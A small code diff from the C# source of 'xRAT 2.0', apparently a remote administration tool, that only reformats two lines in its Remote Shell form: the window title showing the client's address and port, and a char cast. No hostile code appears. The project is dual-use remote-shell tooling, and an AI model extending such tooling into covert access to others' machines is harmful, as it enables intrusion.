@@ -21,7 +21,8 @@ namespace xRAT_2.Forms
         private void frmRemoteShell_Load(object sender, EventArgs e)
         {
             if (cClient != null)
-                this.Text = string.Format("xRAT 2.0 - Remote Shell [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());
+                this.Text = string.Format("xRAT 2.0 - Remote Shell [{0}:{1}]", cClient.EndPoint.Address.ToString(),
+                    cClient.EndPoint.Port.ToString());
         }
 
         private void frmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
@@ -61,7 +62,7 @@ namespace xRAT_2.Forms
 
         private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
         {
-            if (e.KeyChar != (char)2)
+            if (e.KeyChar != (char) 2)
             {
                 txtConsoleInput.Text += e.KeyChar.ToString();
                 txtConsoleInput.Focus();
